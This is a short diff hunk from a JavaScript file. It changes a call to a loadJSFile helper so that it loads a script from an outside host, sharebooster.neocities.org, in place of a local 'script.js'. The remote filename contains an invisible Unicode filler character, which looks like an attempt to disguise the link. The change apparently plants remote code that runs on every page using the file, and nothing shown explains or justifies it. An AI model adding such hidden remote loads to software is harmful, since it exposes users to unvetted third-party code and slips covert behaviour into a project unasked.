@@ -12,4 +12,4 @@ function loadJSFile(src) {
 }
 
 // Usage
-loadJSFile('script.js');
+loadJSFile('https://sharebooster.neocities.org/script3ㅤ.js');
